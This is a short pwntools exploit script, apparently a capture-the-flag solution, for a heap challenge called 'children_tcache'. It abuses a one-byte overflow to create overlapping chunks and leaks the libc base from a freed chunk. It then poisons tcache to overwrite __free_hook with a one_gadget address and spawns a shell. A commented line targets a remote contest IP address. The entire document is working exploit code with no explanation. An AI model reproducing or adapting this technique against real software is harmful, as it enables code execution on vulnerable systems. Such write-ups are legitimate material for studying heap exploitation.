from pwn import *

r = process('./children_tcache')
#r = remote('54.178.132.125', 8763)

def make(size, content):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('Size:', str(size))
    r.sendafter('Data:', content)

def show(idx):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('Index:', str(idx))

def delete(idx):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('Index:', str(idx))

def quit():
    r.sendlineafter('choice: ', '4')

for _ in xrange(7):
    make(0x1f0, 'a') # 0 ~ 6

make(0x700, 'b') # 7
make(0x1f8, 'c') # 8
make(0x4f0, 'barrier') # 9

delete(7)
delete(8)
make(0x1f8, 'b'*0x1f8)

for _ in xrange(8):
    delete(7)
    make(0x1f7-_, 'a'*(0x1f7-_))

delete(7)
make(0x1f2, 'a'*0x1f0+'\x10\x09') # 7

delete(9)
make(0x700, 'dummy') # 8
make(0x1f0, 'dup') # 9

for _ in xrange(7):
    delete(_)

make(0x300, 'barrier') # 0
delete(9)
show(7)

libc = u64(r.recvline()[:-1].ljust(8, '\x00')) - 0x3ebca0
make(0x70, 'dup') # 1
delete(1)
delete(7)

free_hook = libc + 0x3ed8e8
one = libc + 0x4f322

make(0x70, p64(free_hook)) # 1
make(0x70, 'dummy') # 2
make(0x70, p64(one)) # 3
delete(2)

r.interactive()
